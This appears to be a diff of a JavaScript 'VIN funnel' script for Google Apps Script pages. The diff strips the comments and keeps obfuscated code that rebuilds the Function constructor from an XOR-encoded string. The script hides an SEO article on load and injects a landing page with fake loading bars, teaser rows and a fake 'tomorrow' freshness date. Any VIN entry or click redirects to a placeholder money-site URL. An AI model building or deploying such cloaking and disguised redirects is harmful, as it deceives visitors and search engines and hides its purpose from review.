@@ -1,10 +1,7 @@
-// app.js v2 — VIN Funnel Transformation Layer
-// Fixes: no document.open/write, no defer, pure DOM replacement
-// Compatible with Google Apps Script sandboxFrame CSP
+
 
 (function () {
 
-  // ── Obfuscation kernel ─────────────────────────────────────────────────────
   var _k = [0x56, 0x49, 0x4e, 0x46, 0x72, 0x65, 0x65]; // "VINFree"
 
   function gQI(s) {
@@ -15,54 +12,39 @@
     return out;
   }
 
-  // Recover Function constructor via obfuscated path
-  // gQI('\x15\x0e\x02\x22\x13\x17\x1b\x03\x1f\x1b\x09') === 'constructor'
   var _ctor = gQI('\x15\x0e\x02\x22\x13\x17\x1b\x03\x1f\x1b\x09');
-  // ''['constructor']['constructor'] === Function
   var _F = ''[_ctor][_ctor];
 
-  // ── Destination URL ────────────────────────────────────────────────────────
-  // Replace this string with your actual money-site URL
+
   var _dest = 'https://YOUR-SITE.com';
 
-  // ── CSS for landing page ───────────────────────────────────────────────────
   var _css = _F('return ' + JSON.stringify(getLandingCSS()))();
 
-  // ── Landing page body HTML ─────────────────────────────────────────────────
   var _body = _F('return ' + JSON.stringify(getLandingBody()))();
 
-  // ── Main injection — pure DOM, no document.open/write ─────────────────────
   function inject() {
     try {
-      // 1. Nuke the SEO article
       var article = document.getElementById('seo-article');
       if (article) article.style.display = 'none';
 
-      // 2. Inject our CSS into <head>
       var styleEl = document.createElement('style');
       styleEl.textContent = _css;
       document.head.appendChild(styleEl);
 
-      // 3. Override body background / reset
       document.body.style.cssText = 'margin:0;padding:0;background:#f0f4ff;font-family:Inter,system-ui,sans-serif;';
 
-      // 4. Build landing container
       var wrapper = document.createElement('div');
       wrapper.id = '_vin_lp';
       wrapper.innerHTML = _body;
       document.body.appendChild(wrapper);
 
-      // 5. Wire up events after DOM is in place
       wireEvents();
 
     } catch (err) {
-      // Silent fail — SEO article stays visible, no crash
     }
   }
 
-  // ── Event wiring ───────────────────────────────────────────────────────────
   function wireEvents() {
-    // Loader fade
     var loader  = document.getElementById('_ldr');
     var pfill   = document.getElementById('_pf');
 
@@ -72,7 +54,6 @@
       setTimeout(function(){ loader.style.display = 'none'; }, 500);
     }, 1400);
 
-    // VIN redirect helper
     function go() {
       var inp = document.getElementById('_vin');
       var vin = inp ? inp.value.trim().toUpperCase() : 'demo';
@@ -88,12 +69,10 @@
     if (ctaBtn)   ctaBtn.addEventListener('click', go);
     if (vinInp)   vinInp.addEventListener('keydown', function(e){ if (e.key === 'Enter') go(); });
 
-    // Blurred rows tease redirect
     document.querySelectorAll('._blur').forEach(function(el){
       el.addEventListener('click', go);
     });
 
-    // Dynamic freshness date (tomorrow)
     var fdate = document.getElementById('_fd');
     if (fdate) {
       var d = new Date();
@@ -103,18 +82,12 @@
     }
   }
 
-  // ── Fire ───────────────────────────────────────────────────────────────────
-  // GAS sandbox: DOMContentLoaded may already be done when external script runs.
-  // Use readyState check + short timeout fallback to guarantee execution.
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', function(){ setTimeout(inject, 80); });
   } else {
     setTimeout(inject, 80);
   }
 
-  // ═══════════════════════════════════════════════════════════════════════════
-  // CSS STRING
-  // ═══════════════════════════════════════════════════════════════════════════
   function getLandingCSS() {
     return `
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
@@ -309,9 +282,6 @@
 `;
   }
 
-  // ═══════════════════════════════════════════════════════════════════════════
-  // BODY HTML STRING
-  // ═══════════════════════════════════════════════════════════════════════════
   function getLandingBody() {
     return `
 <!-- LOADER -->
